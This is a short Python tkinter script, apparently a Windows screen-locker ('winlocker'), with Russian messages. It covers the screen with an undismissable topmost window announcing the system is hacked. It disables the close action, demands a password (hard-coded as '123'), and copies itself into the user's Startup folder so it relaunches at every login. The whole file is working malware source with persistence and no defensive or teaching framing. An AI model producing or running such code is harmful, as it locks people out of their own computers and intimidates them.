import sys
import tkinter
import shutil
from pathlib import Path
import os

root = tkinter.Tk()

def add_to_startup_folder():
    startup_folder = Path(os.path.expanduser('~')) / 'AppData' / 'Roaming' / 'Microsoft' / 'Windows' / 'Start Menu' / 'Programs' / 'Startup'
    
    if getattr(sys, 'frozen', False):
        current_file = sys.executable
    else:
        current_file = sys.argv[0]
    
    target_path = startup_folder / os.path.basename(current_file)
    
    if not target_path.exists():
        shutil.copy2(current_file, target_path)
        print(f"Программа добавлена в автозагрузку: {target_path}")
        return True
    else:
        print("Программа уже в автозагрузке")
        return False

def Quit():
    pass

def checkPassword(arg):
    if password.get() == "123":
        root.destroy()
        sys.exit()

X = root.winfo_screenwidth()
Y = root.winfo_screenheight()

bg = "black"
font = "Arial 25 bold"

root["bg"] = bg
root.protocol("WM_DELETE_WINDOW", Quit)
root.attributes("-topmost", True)
root.attributes("-toolwindow", True)
root.geometry(f'{X}x{Y}')
root.overrideredirect(True)

tkinter.Label(text="Ваш windows взломан!", fg="red", bg=bg, font=font).pack()
tkinter.Label(text="\n\n\n\n\nВведите пароль", fg="white", bg=bg, font=font).pack()

password = tkinter.Entry(font=font)
password.pack()
password.bind("<Return>", checkPassword)
add_to_startup_folder()
root.mainloop()